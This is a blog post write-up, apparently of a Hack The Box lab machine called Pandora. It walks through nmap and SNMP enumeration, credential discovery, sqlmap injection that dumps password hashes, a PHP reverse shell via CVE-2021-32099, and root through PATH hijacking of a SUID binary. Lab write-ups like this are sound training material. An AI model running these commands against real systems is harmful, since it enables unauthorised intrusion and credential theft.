<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Pandora | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Pandora - Writeup /Mostly Notes/"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-03-04-htb-pandora-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-03-04-htb-pandora-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - Pandora"><meta property="og:description" content="HTB - Pandora - Writeup /Mostly Notes/"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-03-04-htb-pandora-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-03-04T00:00:00+00:00"><meta property="article:modified_time" content="2024-03-04T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Pandora"><meta name=twitter:description content="HTB - Pandora - Writeup /Mostly Notes/"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Pandora","item":"https://cadil.github.io/posts/2024-03-04-htb-pandora-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Pandora","name":"HTB - Pandora","description":"HTB - Pandora - Writeup /Mostly Notes/","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.136 # Local Address 10.10.14.4 2. Nmap nmap -sV -sC -oA nmap/pandora 10.10.11.136 Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-20 23:41 EST Nmap scan report for 10.10.11.136 Host is up (0.24s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) |_ 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Play | Landing Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.71 seconds nmap -vvv -p 22,80 -A -v -sC -sV -oN intial.nmap 10.10.11.136 # Nmap 7.91 scan initiated Sun Feb 20 23:44:42 2022 as: nmap -vvv -p 22, -A -v -sC -sV -oN nmap/intial.nmap 80 10.10.11.136 Nmap scan report for 80 (0.0.0.80) [host down, received no-response] Nmap scan report for 10.10.11.136 Host is up, received syn-ack (0.24s latency). Scanned at 2022-02-20 23:44:42 EST for 11s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs= | 256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w= | 256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sun Feb 20 23:44:53 2022 -- 2 IP addresses (1 host up) scanned in 11.32 seconds sudo nmap -sU -top-ports=20 panda.htb Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-21 00:03 EST Nmap scan report for panda.htb (10.10.11.136) Host is up (0.24s latency). PORT STATE SERVICE 53/udp open|filtered domain 67/udp closed dhcps 68/udp closed dhcpc 69/udp closed tftp 123/udp closed ntp 135/udp closed msrpc 137/udp open|filtered netbios-ns 138/udp closed netbios-dgm 139/udp open|filtered netbios-ssn 161/udp open|filtered snmp 162/udp closed snmptrap 445/udp closed microsoft-ds 500/udp closed isakmp 514/udp closed syslog 520/udp closed route 631/udp closed ipp 1434/udp closed ms-sql-m 1900/udp closed upnp 4500/udp closed nat-t-ike 49152/udp closed unknown Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds 3. Snmpwalk sudo apt-get install snmp snmpwalk -v 1 -c public panda.htb \u003e common.txt -u daniel -p HotelBabylon23 SSH\nssh daniel@10.10.11.136 #id uid=1001(daniel) gid=1001(daniel) groups=1001(daniel) #sudo -l Sorry, user daniel may not run sudo on pandora. netstat -tunpn | grep LISTEN (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) 4. Exploitation Hosts\n127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb 127.0.1.1 pandora # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters curl\ncurl localhost.localdomain/pandora_console/ 4.1 Port forwarding port forwarding from vm machine:\nssh -D 9090 daniel@10.10.11.136 #or ssh -i 80:localhost:80 daniel@panda.htb local vm -s localhost.localdomain/pandora_console/ хандана.\nproxychains\nsudo vi /etc/proxychains.conf #add socks5 127.0.0.1 9090 daniel HotelBabylon23 #sqlmap sudo proxychains sqlmap --url=\"http://localhost/pandora_console/include/chart_generator.php?session_id=''\" -D pandora --tables sudo proxychains sqlmap --url=\"http://localhost/pandora_console/include/chart_generator.php?session_id=''\" -D pandora -T tpassword_history --dump Database: pandora Table: tpassword_history [2 entries] +---------+---------+---------------------+----------------------------------+---------------------+ | id_pass | id_user | date_end | password | date_begin | +---------+---------+---------------------+----------------------------------+---------------------+ | 1 | matt | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 | | 2 | daniel | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 | +---------+---------+---------------------+----------------------------------+---------------------+ Session history:\nsudo proxychains sqlmap --url=\"http://localhost/pandora_console/include/chart_generator.php?session_id=''\" -D pandora -T tsessions_php --dump | sdhjq94o4rhh2ae583881rk749 | id_usuario|s:5:\"admin\";alert_msg|a:0:{}new_chat|b:0; | 1645407015 | энэ cookie session болохгүй байсан…\n4.2 CVE-2021-32099 https://github.com/ibnuuby/CVE-2021-32099\nadmin tool -\u003e file manager цэсээр ороод php reverse shell хуулна.\nnc -lvnp 9001 # http://localhost/pandora_console/images/php_rev.php # хандаад shell руу орно. 4.3 Shell balance python3 -c 'import pty;pty.spawn(\"/bin/bash\")' ctrl+z\nstty raw -echo f+g [enter enter] буцаад nc орлоо\nexport TERM=xterm user.txt\nb56461f05***** 5. Enumeration sudo -l # sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted sudo: unable to initialize policy plugin find / -user root -perm -4000 -exec ls -ldb {} \\; \u003e/tmp/suidfiles matt@pandora:/tmp$ ls suidfiles matt@pandora:/tmp$ cat suidfiles -rwsr-xr-x 1 root root 166056 Jan 19 2021 /usr/bin/sudo -rwsr-xr-x 1 root root 31032 May 26 2021 /usr/bin/pkexec -rwsr-xr-x 1 root root 85064 Jul 14 2021 /usr/bin/chfn -rwsr-xr-x 1 root root 44784 Jul 14 2021 /usr/bin/newgrp -rwsr-xr-x 1 root root 88464 Jul 14 2021 /usr/bin/gpasswd -rwsr-xr-x 1 root root 39144 Jul 21 2020 /usr/bin/umount -rwsr-x--- 1 root matt 16816 Dec 3 15:58 /usr/bin/pandora_backup -rwsr-xr-x 1 root root 68208 Jul 14 2021 /usr/bin/passwd -rwsr-xr-x 1 root root 55528 Jul 21 2020 /usr/bin/mount -rwsr-xr-x 1 root root 67816 Jul 21 2020 /usr/bin/su -rwsr-xr-x 1 root root 39144 Mar 7 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 53040 Jul 14 2021 /usr/bin/chsh -rwsr-xr-x 1 root root 473576 Jul 23 2021 /usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root messagebus 51344 Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 14488 Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 22840 May 26 2021 /usr/lib/policykit-1/polkit-agent-helper-1 Backup UtilityNow attempting to backup PandoraFMS clienttar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora!07P@C=jpv=D\"=== @ailed! ssh\nssh-keygen -t rsa # history matt@pandora:/home/matt$ ssh-keygen -t rsa Generating public/private rsa key pair. Enter file in which to save the key (/home/matt/.ssh/id_rsa): Created directory '/home/matt/.ssh'. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/matt/.ssh/id_rsa Your public key has been saved in /home/matt/.ssh/id_rsa.pub The key fingerprint is: SHA256:9zHdIiJsSlQFOaC9aL2Ps3CVHT4hS2hIfWnb0yS0zoo matt@pandora The key's randomart image is: +---[RSA 3072]----+ | ....o*o | | . +.o* ... | | o =oo+++ | | = +.Ooo.. . | | o + S O.+ o .| | . . * + + + . | | . E . . | | o.o | | oo. | +----[SHA256]-----+ cd .ssh cat id_rsa.pub \u003e authorized_keys # history matt@pandora:/home/matt/.ssh$ ls id_rsa id_rsa.pub matt@pandora:/home/matt/.ssh$ cat id_rsa.pub \u003e authorized_keys matt@pandora:/home/matt/.ssh$ ls authorized_keys id_rsa id_rsa.pub matt@pandora:/home/matt/.ssh$ cat authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMWVpzp5*******************k= matt@pandora matt@pandora:/home/matt/.ssh$ chmod 700 .ssh cd .ssh chmod 600 authorized_keys Local vm руу id_rsa хуулна.\nmatt@pandora:/home/matt/.ssh$ python3 -m http.server 9001 Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ... 10.10.14.6 - - [22/Feb/2022 06:28:54] \"GET /id_rsa HTTP/1.1\" 200 - 10.10.14.6 - - [22/Feb/2022 06:29:09] \"GET /id_rsa HTTP/1.1\" 200 - # Local VM └──╼ $curl 10.10.11.136:9001/id_rsa -o id_rsa % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 2602 100 2602 0 0 5172 0 --:--:-- --:--:-- --:--:-- 5235 # chmod chmod 600 id_rsa ssh -i id_rsa matt@10.10.11.136 matt ssh:\necho \"/bin/bash\" \u003e tar chmod +x tar export PATH=$(pwd):$PATH /usr/bin/pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client root.txt\n9087141******** ","wordCount":"1069","inLanguage":"mn","datePublished":"2024-03-04T00:00:00Z","dateModified":"2024-03-04T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-03-04-htb-pandora-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://cadil.github.io/bookmark/ title=Bookmark><span>Bookmark</span></a></li><li><a href=https://cadil.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Pandora</h1><div class=post-description>HTB - Pandora - Writeup /Mostly Notes/</div><div class=post-meta><span title='2024-03-04 00:00:00 +0000 UTC'>гуравдугаар сар 4, 2024</span>&nbsp;·&nbsp;6 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-snmpwalk aria-label="3. Snmpwalk">3. Snmpwalk</a></li><li><a href=#4-exploitation aria-label="4. Exploitation">4. Exploitation</a><ul><li><a href=#41-port-forwarding aria-label="4.1 Port forwarding">4.1 Port forwarding</a></li><li><a href=#42-cve-2021-32099 aria-label="4.2 CVE-2021-32099">4.2 CVE-2021-32099</a></li><li><a href=#43-shell-balance aria-label="4.3 Shell balance">4.3 Shell balance</a></li></ul></li><li><a href=#5-enumeration aria-label="5. Enumeration">5. Enumeration</a></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Machine Address</span>
</span></span><span style=display:flex><span>10.10.11.136
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Local Address</span>
</span></span><span style=display:flex><span>10.10.14.4
</span></span></code></pre></div><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -sV -sC -oA nmap/pandora 10.10.11.136
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-02-20 23:41 EST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.136
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>998</span> closed ports
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.41 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.41 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Play | Landing
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 33.71 seconds
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>nmap -vvv -p 22,80 -A -v -sC -sV -oN intial.nmap 10.10.11.136
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.91 scan initiated Sun Feb 20 23:44:42 2022 as: nmap -vvv -p 22, -A -v -sC -sV -oN nmap/intial.nmap 80 10.10.11.136</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span>0.0.0.80<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>host down, received no-response<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.136
</span></span><span style=display:flex><span>Host is up, received syn-ack <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Scanned at 2022-02-20 23:44:42 EST <span style=color:#66d9ef>for</span> 11s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE REASON  VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPIYGoHvNFwTTboYexVGcZzbSLJQsxKopZqrHVTeF8oEIu0iqn7E5czwVkxRO/icqaDqM+AB3QQVcZSDaz//XoXsT/NzNIbb9SERrcK/n8n9or4IbXBEtXhRvltS8NABsOTuhiNo/2fdPYCVJ/HyF5YmbmtqUPols6F5y/MK2Yl3eLMOdQQeax4AWSKVAsR+issSZlN2rADIvpboV7YMoo3ktlHKz4hXlX6FWtfDN/ZyokDNNpgBbr7N8zJ87+QfmNuuGgmcZzxhnzJOzihBHIvdIM4oMm4IetfquYm1WKG3s5q70jMFrjp4wCyEVbxY+DcJ54xjqbaNHhVwiSWUZnAyWe4gQGziPdZH2ULY+n3iTze+8E4a6rxN3l38d1r4THoru88G56QESiy/jQ8m5+Ang77rSEaT3Fnr6rnAF5VG1+kiA36rMIwLabnxQbAWnApRX9CHBpMdBj7v8oLhCRn7ZEoPDcD1P2AASdaDJjRMuR52YPDlUSDd8TnI/DFFs<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNJGh4HcK3rlrsvCbu0kASt7NLMvAUwB51UnianAKyr9H0UBYZnOkVZhIjDea3F/CxfOQeqLpanqso/EqXcT9w<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOCMYY9DMj/I+Rfosf+yMuevI7VFIeeQfZSxq67EGxsb
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Sun Feb 20 23:44:53 2022 -- 2 IP addresses (1 host up) scanned in 11.32 seconds</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo nmap -sU -top-ports<span style=color:#f92672>=</span><span style=color:#ae81ff>20</span> panda.htb
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-02-21 00:03 EST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> panda.htb <span style=color:#f92672>(</span>10.10.11.136<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.24s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE         SERVICE
</span></span><span style=display:flex><span>53/udp    open|filtered domain
</span></span><span style=display:flex><span>67/udp    closed        dhcps
</span></span><span style=display:flex><span>68/udp    closed        dhcpc
</span></span><span style=display:flex><span>69/udp    closed        tftp
</span></span><span style=display:flex><span>123/udp   closed        ntp
</span></span><span style=display:flex><span>135/udp   closed        msrpc
</span></span><span style=display:flex><span>137/udp   open|filtered netbios-ns
</span></span><span style=display:flex><span>138/udp   closed        netbios-dgm
</span></span><span style=display:flex><span>139/udp   open|filtered netbios-ssn
</span></span><span style=display:flex><span>161/udp   open|filtered snmp
</span></span><span style=display:flex><span>162/udp   closed        snmptrap
</span></span><span style=display:flex><span>445/udp   closed        microsoft-ds
</span></span><span style=display:flex><span>500/udp   closed        isakmp
</span></span><span style=display:flex><span>514/udp   closed        syslog
</span></span><span style=display:flex><span>520/udp   closed        route
</span></span><span style=display:flex><span>631/udp   closed        ipp
</span></span><span style=display:flex><span>1434/udp  closed        ms-sql-m
</span></span><span style=display:flex><span>1900/udp  closed        upnp
</span></span><span style=display:flex><span>4500/udp  closed        nat-t-ike
</span></span><span style=display:flex><span>49152/udp closed        unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 12.38 seconds
</span></span></code></pre></div><h3 id=3-snmpwalk>3. Snmpwalk<a hidden class=anchor aria-hidden=true href=#3-snmpwalk>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo apt-get install snmp
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>snmpwalk -v <span style=color:#ae81ff>1</span> -c public panda.htb &gt; common.txt
</span></span></code></pre></div><figure><img loading=lazy src=/images/pandora_post_image_1.png></figure><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt><span style=display:flex><span>-u daniel -p HotelBabylon23
</span></span></code></pre></div><p>SSH</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh daniel@10.10.11.136
</span></span><span style=display:flex><span><span style=color:#75715e>#id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>daniel<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>daniel<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>daniel<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#sudo -l</span>
</span></span><span style=display:flex><span>Sorry, user daniel may not run sudo on pandora.
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>netstat -tunpn | grep LISTEN
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>(</span>Not all processes could be identified, non-owned process info
</span></span><span style=display:flex><span> will not be shown, you would have to be root to see it all.<span style=color:#f92672>)</span>
